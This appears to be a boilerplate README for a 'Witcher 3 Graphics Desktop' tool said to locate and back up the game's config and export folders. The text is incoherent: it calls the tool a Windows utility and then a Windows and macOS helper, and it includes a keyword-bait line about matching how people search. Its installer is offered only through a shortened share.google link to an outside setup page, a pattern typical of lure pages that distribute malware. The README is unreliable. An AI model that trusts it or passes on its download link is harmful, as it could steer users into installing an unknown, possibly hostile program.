# Witcher 3 Graphics Desktop

*Find the Witcher 3 Graphics folder fast and keep a local spare.*

## What Witcher 3 Graphics Desktop is

**Witcher 3 Graphics Desktop** is a Windows utility. Local Windows and macOS helper for Witcher 3 Graphics data paths, config and export caches, and export folders.

Witcher 3 Graphics config and export files hide under AppData and Documents.

Use it when you want the change on this machine without opening a dozen Settings pages.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Maps Witcher 3 Graphics data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## The problem

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
